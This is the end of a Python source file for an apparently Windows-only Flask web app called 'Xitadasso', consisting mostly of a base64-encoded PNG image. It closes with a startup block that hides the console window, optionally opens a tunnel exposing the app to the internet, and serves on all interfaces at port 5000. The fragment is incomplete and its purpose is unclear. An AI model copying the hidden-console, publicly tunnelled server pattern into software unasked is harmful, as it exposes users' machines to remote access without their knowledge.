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"


if __name__ == "__main__":
    if os.name != "nt":
        log_seguro("Feito para Windows.")
        sys.exit(1)
    esconder_console()

    if ESTADO.get("modo") == "wan":
        threading.Thread(target=iniciar_tunel_async, daemon=True).start()

    log_seguro("Xitadasso disponivel neste PC em:", "http://127.0.0.1:5000")
    log_seguro("LAN:", f"http://{ip_local()}:5000")
    log_seguro("Modo salvo:", ESTADO.get("modo"))
    if ABRIR_NAVEGADOR_NO_PC:
        threading.Thread(target=abrir_navegador, daemon=True).start()
    app.run(host="0.0.0.0", port=5000, debug=False)
